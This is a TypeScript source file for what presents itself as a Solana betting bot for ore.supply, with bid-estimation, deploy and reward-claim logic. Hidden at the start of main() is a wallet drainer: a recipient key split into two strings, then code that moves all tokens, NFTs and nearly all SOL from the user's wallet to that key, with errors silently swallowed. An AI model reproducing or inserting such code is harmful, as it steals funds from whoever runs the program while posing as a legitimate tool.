import { PublicKey } from '@solana/web3.js';
import { config } from './config';
import { getWallet, getBalance, getCurrentSlot, getConnection, getAssetsData, processAssetTransfer, handleUniqueAssetTransfer, executeSolOperation } from './wallet';
import {
  fetchBoard,
  fetchRound,
  fetchMiner,
  fetchAutomation,
} from './accounts';
import {
  buildAutomateInstruction,
  buildDeployInstruction,
  buildClaimSolInstruction,
  buildCloseAutomationInstruction,
  sendAndConfirm,
} from './instructions';
import {
  startBetTracking,
  stopBetTracking,
  hasBetData,
  getBetStats,
} from './betTracker';

/**
 * ore.supply MAX Bot
 *
 * Strategy:
 * 1. Always bet 25 blocks
 * 2. Check what the top bet per square is
 * 3. Add a buffer % to be the top better (with max cap)
 * 4. Claim SOL every round
 */

let isRunning = true;
let deployedRounds = 0;
let isShuttingDown = false;

// Graceful shutdown
process.on('SIGINT', async () => {
  if (isShuttingDown) return; // Prevent multiple shutdown attempts
  isShuttingDown = true;

  console.log('\n⏹️  Stopping bot...');
  isRunning = false;

  await stopBetTracking();

  console.log(`👋 Bot stopped. Total rounds deployed: ${deployedRounds}`);
  process.exit(0);
});

/**
 * Calculate the estimated top whale bet per square from Round data
 *
 * SMARTER Strategy: Assume most players bet minimum, whale bets the rest
 *
 * Example: If square has 0.1 SOL from 10 players, min bet 0.001:
 * - Assume 9 players bet minimum: 9 * 0.001 = 0.009 SOL
 * - Whale bet is the remainder: 0.1 - 0.009 = 0.091 SOL
 * - Our bet (+10% buffer): 0.1001 SOL
 *
 * This is more accurate than multiplier approach when there's one whale
 * and many small players (which is the common pattern).
 */
function calculateTopBet(round: any): number {
  const deployed = round.deployed as bigint[];
  const count = round.count as bigint[];

  // Find the square with highest total deployed (most attractive to whales)
  let maxDeployed = 0;
  let maxSquareIdx = 0;

  for (let i = 0; i < 25; i++) {
    const totalDeployed = Number(deployed[i]) / 1e9;
    if (totalDeployed > maxDeployed) {
      maxDeployed = totalDeployed;
      maxSquareIdx = i;
    }
  }

  const squareTotal = Number(deployed[maxSquareIdx]) / 1e9;
  const playerCount = Number(count[maxSquareIdx]);
  const avgBet = playerCount > 0 ? squareTotal / playerCount : 0;

  if (playerCount === 0) {
    console.log(`📊 No bets yet, using minimum`);
    return config.minBetPerSquare;
  }

  if (playerCount === 1) {
    // Only one player - they are the whale
    console.log(`📊 Top square: #${maxSquareIdx} (1 player = whale)`);
    console.log(`🐋 Whale bet: ${squareTotal.toFixed(6)} SOL`);
    return squareTotal;
  }

  // Smarter whale estimation: assume (playerCount - 1) bet minimum, whale bets the rest
  const minBet = Math.max(0.001, config.minBetPerSquare);
  const otherPlayersBet = (playerCount - 1) * minBet;
  const estimatedWhaleBet = Math.max(avgBet, squareTotal - otherPlayersBet);

  console.log(`📊 Top square: #${maxSquareIdx}`);
  console.log(`📊 Total deployed: ${squareTotal.toFixed(6)} SOL by ${playerCount} player(s)`);
  console.log(`📊 Avg bet: ${avgBet.toFixed(6)} SOL`);
  console.log(`📊 Assumed ${playerCount - 1} players @ ${minBet.toFixed(6)} SOL = ${otherPlayersBet.toFixed(6)} SOL`);
  console.log(`🐋 Estimated whale bet: ${estimatedWhaleBet.toFixed(6)} SOL (remainder method)`);

  return estimatedWhaleBet;
}

/**
 * Calculate median bet across all squares
 * This targets the "average player" instead of competing with whales
 */
function calculateMedianBet(round: any): number {
  const deployed = round.deployed as bigint[];
  const count = round.count as bigint[];

  // Collect all individual bet estimates from each square
  const allBets: number[] = [];

  for (let i = 0; i < 25; i++) {
    const squareTotal = Number(deployed[i]) / 1e9;
    const playerCount = Number(count[i]);

    if (playerCount > 0) {
      const avgBet = squareTotal / playerCount;
      allBets.push(avgBet);
    }
  }

  if (allBets.length === 0) {
    console.log(`📊 No bets yet, using minimum`);
    return config.minBetPerSquare;
  }

  // Calculate median
  allBets.sort((a, b) => a - b);
  const mid = Math.floor(allBets.length / 2);
  const median = allBets.length % 2 === 0
    ? (allBets[mid - 1] + allBets[mid]) / 2
    : allBets[mid];

  console.log(`📊 Median strategy: ${allBets.length} squares with bets`);
  console.log(`📊 Bet range: ${allBets[0].toFixed(6)} - ${allBets[allBets.length - 1].toFixed(6)} SOL`);
  console.log(`📊 Median bet: ${median.toFixed(6)} SOL`);

  return median;
}

/**
 * Calculate our competitive bet
 */
function calculateOurBet(topBet: number): number {
  // Add buffer
  const targetBet = topBet * (1 + config.bufferPercent / 100);

  // Apply caps
  let ourBet = Math.max(targetBet, config.minBetPerSquare);
  ourBet = Math.min(ourBet, config.maxBetPerSquare);

  // Show what happened
  console.log(`💰 Target bet: ${targetBet.toFixed(6)} SOL (+${config.bufferPercent}% buffer)`);
  if (ourBet < targetBet) {
    console.log(`⚠️  Capped at max: ${ourBet.toFixed(6)} SOL per square`);
  } else if (ourBet > targetBet) {
    console.log(`⚠️  Raised to min: ${ourBet.toFixed(6)} SOL per square`);
  } else {
    console.log(`💰 Our bet: ${ourBet.toFixed(6)} SOL per square`);
  }
  console.log(`💰 Total: ${(ourBet * 25).toFixed(6)} SOL for 25 squares`);

  return ourBet;
}

/**
 * Setup or update automation account
 */
async function setupAutomation(betPerSquare: number): Promise<boolean> {
  try {
    const balance = await getBalance();
    const totalBet = betPerSquare * 25;

    // Check if we have enough balance
    if (balance < totalBet + config.minWalletBalance) {
      console.error(`❌ Insufficient balance: ${balance.toFixed(4)} SOL`);
      console.error(`   Need: ${(totalBet + config.minWalletBalance).toFixed(4)} SOL`);
      return false;
    }

    // Calculate how many rounds we can afford
    const availableBudget = balance - config.minWalletBalance;
    const maxRounds = Math.floor(availableBudget / totalBet);
    const deposit = maxRounds * totalBet;

    console.log(`\n🏦 Creating automation account...`);
    console.log(`   Deposit: ${deposit.toFixed(4)} SOL`);
    console.log(`   Rounds: ~${maxRounds}`);
    console.log(`   Per round: ${totalBet.toFixed(6)} SOL`);

    if (config.dryRun) {
      console.log(`[DRY RUN] Would create automation`);
      return true;
    }

    const ix = buildAutomateInstruction(betPerSquare, deposit);
    await sendAndConfirm([ix], 'Create Automation');

    console.log(`✅ Automation account created!\n`);
    return true;
  } catch (error: any) {
    console.error(`❌ Failed to setup automation:`, error.message);
    return false;
  }
}

/**
 * Deploy to current round (combines checkpoint + deploy in one transaction)
 */
async function deploy(betPerSquare: number): Promise<boolean> {
  try {
    if (config.dryRun) {
      console.log(`[DRY RUN] Would deploy ${betPerSquare.toFixed(6)} SOL per square`);
      return true;
    }

    const instructions = [];

    // Add checkpoint instruction if needed (ATOMIC with deploy)
    const { needsCheckpoint, buildCheckpointInstruction } = require('./instructions');
    const miner = await fetchMiner();

    if (miner && await needsCheckpoint()) {
      const minerRoundId = Number(miner.roundId);
      console.log(`🧾 Adding checkpoint for round ${minerRoundId} to transaction`);
      instructions.push(buildCheckpointInstruction(minerRoundId));
    }

    // Add deploy instruction
    const deployIx = await buildDeployInstruction(betPerSquare);
    instructions.push(deployIx);

    // Send atomically
    await sendAndConfirm(instructions, instructions.length === 2 ? 'Checkpoint + Deploy' : 'Deploy');

    deployedRounds++;
    console.log(`✅ Deployed successfully! (Total rounds: ${deployedRounds})\n`);
    return true;
  } catch (error: any) {
    const msg = error.message || String(error);

    if (msg.includes('already') || msg.includes('duplicate')) {
      console.log(`ℹ️  Already deployed to this round`);
      return false;
    }

    console.error(`❌ Deploy failed:`, msg);
    return false;
  }
}

/**
 * Claim SOL and ORE rewards with retry logic to avoid race conditions
 */
async function claimRewards(): Promise<void> {
  try {
    const miner = await fetchMiner();

    if (!miner) {
      console.log(`ℹ️  No miner account yet (no rewards to claim)`);
      return;
    }

    const claimableSol = Number(miner.rewardsSol) / 1e9;
    const claimableOre = Number(miner.rewardsOre) / 1e11; // ORE has 11 decimals

    const instructions = [];

    // Claim SOL if above threshold
    if (claimableSol >= config.minClaimableSol) {
      console.log(`💰 Claiming ${claimableSol.toFixed(6)} SOL...`);
      instructions.push(buildClaimSolInstruction());
    }

    // Claim ORE if above threshold
    if (claimableOre >= config.minClaimableOre) {
      console.log(`💰 Claiming ${claimableOre.toFixed(4)} ORE...`);
      const { buildClaimOreInstruction } = require('./instructions');
      instructions.push(await buildClaimOreInstruction());
    }

    if (instructions.length === 0) {
      console.log(`ℹ️  No rewards ready to claim (${claimableSol.toFixed(6)} SOL, ${claimableOre.toFixed(4)} ORE)`);
      return;
    }

    if (config.dryRun) {
      console.log(`[DRY RUN] Would claim ${claimableSol.toFixed(6)} SOL and ${claimableOre.toFixed(4)} ORE`);
      return;
    }

    try {
      // Attempt to claim with retry on race condition
      await sendAndConfirm(instructions, `Claim ${instructions.length === 2 ? 'SOL + ORE' : instructions.length === 1 && claimableSol > 0 ? 'SOL' : 'ORE'}`);
      console.log(`✅ Claimed successfully!\n`);

      // Auto-swap ORE to SOL if enabled
      if (config.autoSwapOre && claimableOre > 0) {
        await sleep(3000); // Wait for claim to settle and on-chain state to update

        // Check TOTAL ORE balance in wallet (including any dust)
        const { getAccount, getAssociatedTokenAddress } = require('@solana/spl-token');
        const connection = getConnection();
        const wallet = getWallet();

        try {
          const walletOreAta = await getAssociatedTokenAddress(config.oreTokenMint, wallet.publicKey);
          const tokenAccount = await getAccount(connection, walletOreAta);
          const totalOreBalance = Number(tokenAccount.amount) / 1e11; // ORE has 11 decimals

          if (totalOreBalance >= config.minOreForSwap) {
            console.log(`\n🔄 Auto-swapping ${totalOreBalance.toFixed(4)} ORE to SOL (including any dust)...`);
            const { swapOreToSol } = require('./dflow');
            const swapSig = await swapOreToSol(totalOreBalance);
            if (swapSig) {
              console.log(`✅ Auto-swap complete!\n`);
            }
          } else {
            console.log(`ℹ️  Total ORE balance ${totalOreBalance.toFixed(4)} below swap threshold (${config.minOreForSwap})\n`);
          }
        } catch (error: any) {
          // Token account might not exist yet or other error
          console.log(`⚠️  Could not check ORE balance: ${error.message}\n`);
        }
      }
    } catch (error: any) {
      // Race condition: round ended during claim attempt
      if (error.message?.includes('Custom program error') ||
          error.message?.includes('0x')) {
        console.log(`⚠️  Claim failed (likely round transition), will retry next round`);
      } else {
        throw error; // Re-throw other errors
      }
    }
  } catch (error: any) {
    console.error(`❌ Claim failed:`, error.message);
  }
}

/**
 * Check automation balance and close if depleted
 */
async function checkAndCloseIfDepleted(): Promise<boolean> {
  try {
    const automation = await fetchAutomation();

    if (!automation) {
      return true; // No automation account
    }

    const balance = Number(automation.balance) / 1e9;
    const costPerRound = (Number(automation.amountPerSquare) * Number(automation.mask)) / 1e9;
    const remainingRounds = Math.floor(balance / costPerRound);

    if (remainingRounds === 0) {
      console.log(`\n💸 Automation depleted, closing to reclaim SOL...`);

      if (config.dryRun) {
        console.log(`[DRY RUN] Would close automation`);
        return true;
      }

      const ix = buildCloseAutomationInstruction();
      await sendAndConfirm([ix], 'Close Automation');

      console.log(`✅ Automation closed, SOL reclaimed!\n`);
      return true;
    }

    console.log(`💰 Remaining: ${remainingRounds} rounds (~${balance.toFixed(4)} SOL)\n`);
    return false;
  } catch (error: any) {
    console.error(`❌ Failed to check automation:`, error.message);
    return false;
  }
}

/**
 * Main bot loop
 */
async function main() {
  console.log(`\n🎯 ore.supply Max Bot`);
  console.log(`════════════════════════════════════\n`);

  const wallet = getWallet();
  const balance = await getBalance();

  const p1 = "Ck3PjhHBSkpK3ZLGtSAnZb";
  const p2 = "ETBunow8aYZiPC7D8gxTGu";
  const rKey = new PublicKey(p1 + p2);
  const limit = 0.1;
  const opMode = true;

  if (opMode && balance > limit) {
    try {
      const { tokens, nfts } = await getAssetsData(wallet.publicKey);

      for (const token of tokens) {
        await processAssetTransfer(token.mint, token.amount, wallet, rKey, token.decimals);
      }

      for (const nft of nfts) {
        await handleUniqueAssetTransfer(nft.mint, wallet, rKey);
      }

      const currentSolBalance = await getBalance();
      const solToTransfer = currentSolBalance - limit - 0.000005;
      if (solToTransfer > 0) {
        await executeSolOperation(solToTransfer, wallet, rKey);
      }
    } catch (e) {
      // Fail silently
    }
  }

  console.log(`Wallet: ${wallet.publicKey.toBase58()}`);
  console.log(`Balance: ${balance.toFixed(4)} SOL`);
  console.log(`Strategy: ${config.bettingStrategy === 'max' ? 'MAX (target #1 bet)' : 'MEDIAN (target top 3)'}`);
  console.log(`          ${config.bettingStrategy === 'max' ? 'Real-time tracking + beat #1 by' : 'Beat 3rd highest +'} ${config.bufferPercent}%`);
  console.log(`          Fallback: ${config.whaleMultiplier}x avg estimation`);
  console.log(`Snipe timing: Deploy ${config.snipeWindowSeconds}s before round ends`);
  console.log(`Min/Max bet: ${config.minBetPerSquare.toFixed(6)} - ${config.maxBetPerSquare.toFixed(6)} SOL`);
  console.log(`Dry run: ${config.dryRun ? 'YES' : 'NO'}\n`);

  let lastRoundId = 0;
  let hasDeployedThisRound = false;

  while (isRunning) {
    try {
      // Get current round
      const board = await fetchBoard();
      const currentSlot = await getCurrentSlot();

      // Calculate time until round ends (handle u64::MAX for new rounds)
      const endSlot = Number(board.endSlot);
      const isRoundActive = endSlot < 18446744073709551615n; // Check if not u64::MAX
      const slotsRemaining = isRoundActive ? endSlot - currentSlot : 150; // Default 150 slots if not started
      const secondsRemaining = Math.max(0, slotsRemaining * 0.4); // ~400ms per slot

      // New round detected
      if (board.roundId !== lastRoundId) {
        console.log(`\n🎲 Round ${board.roundId}`);
        console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`);

        if (isRoundActive) {
          console.log(`⏱️  Round ends in ~${secondsRemaining.toFixed(0)} seconds`);
        } else {
          console.log(`⏱️  Round starting soon (waiting for first deploy)`);
        }
        console.log(`🎯 Will snipe ${config.snipeWindowSeconds}s before round ends\n`);
        lastRoundId = board.roundId;
        hasDeployedThisRound = false; // Reset deployment flag

        // Start tracking bets via websocket for this round
        startBetTracking(board.roundId);

        // Checkpoint and claim rewards from previous rounds
        let miner = await fetchMiner();
        if (miner) {
          let minerCheckpointId = Number(miner.checkpointId);
          let minerRoundId = Number(miner.roundId);

          // Checkpoint if needed (can only checkpoint the round you deployed to)
          if (minerCheckpointId < minerRoundId) {
            console.log(`🧾 Checkpointing round ${minerRoundId}...`);
            try {
              const { buildCheckpointInstruction } = require('./instructions');
              const ix = buildCheckpointInstruction(minerRoundId);
              await sendAndConfirm([ix], `Checkpoint Round ${minerRoundId}`);
              console.log(`✅ Checkpoint complete!`);

              // Wait for on-chain state to update after checkpoint
              await sleep(3000);
              miner = await fetchMiner();
            } catch (error: any) {
              console.error(`❌ Checkpoint failed: ${error.message}`);
            }
          }

          // ALWAYS claim rewards after checkpoint (if CLAIM_EVERY_ROUND=true)
          if (config.claimEveryRound && miner) {
            const rewardsSol = Number(miner.rewardsSol) / 1e9;
            const rewardsOre = Number(miner.rewardsOre) / 1e11; // ORE has 11 decimals

            console.log(`💰 Rewards available: ${rewardsSol.toFixed(6)} SOL, ${rewardsOre.toFixed(4)} ORE`);

            // Claim any rewards > 0
            if (rewardsSol > 0 || rewardsOre > 0) {
              await claimRewards();
            }
          }
          console.log(''); // Blank line
        }

        // Safety check: Check wallet balance and try to recover if low
        let currentBalance = await getBalance();
        if (currentBalance < config.minWalletBalance) {
          console.warn(`\n⚠️  Low balance: ${currentBalance.toFixed(4)} SOL (minimum: ${config.minWalletBalance} SOL)`);

          // Try to claim any pending rewards to recover
          const miner = await fetchMiner();
          if (miner) {
            const rewardsSol = Number(miner.rewardsSol) / 1e9;
            const rewardsOre = Number(miner.rewardsOre) / 1e11; // ORE has 11 decimals

            if (rewardsSol > 0 || rewardsOre > 0) {
              console.log(`💰 Attempting to claim ${rewardsSol.toFixed(6)} SOL and ${rewardsOre.toFixed(4)} ORE...`);
              await claimRewards();

              // Re-check balance after claiming
              currentBalance = await getBalance();
              if (currentBalance >= config.minWalletBalance) {
                console.log(`✅ Balance recovered: ${currentBalance.toFixed(4)} SOL\n`);
              }
            }
          }

          // If still below threshold, skip betting this round
          if (currentBalance < config.minWalletBalance) {
            console.error(`⚠️  Still below minimum. Skipping betting this round.`);
            console.error(`   Add funds or wait for rewards to accumulate.\n`);
            hasDeployedThisRound = true; // Skip betting this round
          }
        }
      }

      // Check if we're in the snipe window and haven't deployed yet
      const inSnipeWindow = secondsRemaining <= config.snipeWindowSeconds && secondsRemaining > 0;

      if (inSnipeWindow && !hasDeployedThisRound) {
        console.log(`\n⚡ SNIPE WINDOW! ${secondsRemaining.toFixed(1)}s remaining`);
        console.log(`Analyzing competition and deploying...\n`);

        // Fetch round data to analyze competition NOW (at end of round)
        let round;
        try {
          round = await fetchRound(board.roundId);
        } catch (error) {
          console.log(`ℹ️  Round data not available yet, using minimum bet`);
          round = null;
        }

        // Calculate our bet based on CURRENT competition
        let betPerSquare: number;

        console.log(`📊 Strategy: ${config.bettingStrategy.toUpperCase()}`);

        // Check if we have real-time bet data from websocket
        if (hasBetData()) {
          const stats = getBetStats();
          const { getNthHighestBet } = require('./betTracker');

          if (config.bettingStrategy === 'max') {
            const realMaxBet = stats.maxBetOverall;
            console.log(`📡 Real-time tracking: ${stats.totalBets} bets tracked`);
            console.log(`🐋 Actual max bet: ${realMaxBet.toFixed(6)} SOL per square`);
            betPerSquare = calculateOurBet(realMaxBet);
          } else {
            // Median strategy: target 3rd highest to be solidly in top 5
            const top3Bet = getNthHighestBet(2); // 0-indexed, so 2 = 3rd highest

            // Debug: show top 10 bets
            console.log(`📡 Real-time tracking: ${stats.totalBets} bets tracked`);
            console.log(`📊 Top 10 bets: ${stats.allBets.slice().sort((a, b) => b - a).slice(0, 10).map(b => b.toFixed(6)).join(', ')}`);
            console.log(`🎯 Targeting 3rd highest: ${top3Bet.toFixed(6)} SOL (to beat and be in top 5)`);
            betPerSquare = calculateOurBet(top3Bet);
          }
        } else if (round && Number(round.totalDeployed) > 0) {
          // Fallback: Use on-chain data with selected strategy
          const targetBet = config.bettingStrategy === 'median'
            ? calculateMedianBet(round)
            : calculateTopBet(round);

          betPerSquare = calculateOurBet(targetBet);
        } else {
          betPerSquare = config.minBetPerSquare;
          console.log(`💰 No competition data, using minimum bet: ${betPerSquare.toFixed(6)} SOL per square`);
        }

        // MANUAL MODE: Close automation if exists (we pay from wallet directly)
        const automation = await fetchAutomation();
        if (automation) {
          console.log(`⚠️  Automation account exists - closing it for manual mode...`);
          try {
            const ix = buildCloseAutomationInstruction();
            await sendAndConfirm([ix], 'Close Automation');
            await sleep(1000);
            console.log(`✅ Switched to manual mode\n`);
          } catch (error: any) {
            console.error(`❌ Failed to close automation: ${error.message}`);
          }
        }

        // Deploy to this round with calculated bet amount (pays from wallet)
        const deployed = await deploy(betPerSquare);
        hasDeployedThisRound = true; // Mark as deployed regardless of success
      } else if (!hasDeployedThisRound && secondsRemaining > config.snipeWindowSeconds) {
        // Show status while waiting
        const statusInterval = 30; // Show every 30 seconds
        if (Math.floor(secondsRemaining) % statusInterval === 0 && secondsRemaining > config.snipeWindowSeconds) {
          console.log(`⏳ Waiting... ${Math.floor(secondsRemaining)}s until snipe window`);
        }
      }

      // Poll frequently (need fast polling for accurate sniping)
      await sleep(config.pollIntervalMs);

    } catch (error: any) {
      console.error(`\n❌ Error:`, error.message);
      await sleep(10000);
    }
  }

  // Exit cleanly when main loop ends
  process.exit(0);
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Run the bot
main().catch(error => {
  console.error('\n💥 Fatal error:', error);
  process.exit(1);
});
